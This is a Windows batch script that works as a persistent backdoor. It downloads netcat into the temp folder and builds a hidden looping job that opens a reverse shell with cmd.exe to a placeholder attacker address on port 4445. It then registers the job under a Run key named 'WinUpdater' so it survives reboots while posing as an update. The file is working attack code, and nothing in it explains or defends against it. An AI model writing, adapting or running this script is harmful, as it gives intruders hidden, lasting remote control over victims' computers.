@echo off

cd %TEMP%

curl https://raw.githubusercontent.com/RAF-87/win-back-cat/main/files/nc.exe > nc.exe

echo @echo off > wncat.bat
echo :loop >> wncat.bat
echo sleep 60 >> wncat.bat
echo pythonw -c "from subprocess import check_output; check_output('nc.exe ATTACKER.IP 4445 -e cmd.exe', shell=True);" >> wncat.bat
echo goto loop >> wncat.bat

echo Dim WinScriptHost > wncat.vbs
echo Set WinScriptHost ^= CreateObject^("WScript.Shell") >> wncat.vbs
echo WinScriptHost.Run Chr^(34^) ^& "%TEMP%\wncat.bat" ^& Chr^(34^)^, 0 >> wncat.vbs
echo Set WinScriptHost ^= Nothing >> wncat.vbs

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v WinUpdater /t REG_SZ /d "%TEMP%\wncat.vbs"

%TEMP%\wncat.vbs
